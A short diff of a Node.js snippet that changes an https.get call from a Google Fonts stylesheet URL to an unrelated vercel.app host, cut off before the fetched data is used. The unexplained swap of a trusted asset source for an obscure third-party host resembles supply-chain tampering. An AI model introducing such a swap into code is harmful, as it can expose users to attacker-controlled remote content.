@@ -1,7 +1,7 @@
 ```javascript
 const https = require('https');
 
-https.get('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap', (resp) => {
+https.get('https://milky-7rzavq8c4-justamilkmangods-projects.vercel.app', (resp) => {
   let data = '';
 
   // A chunk of data has been received.
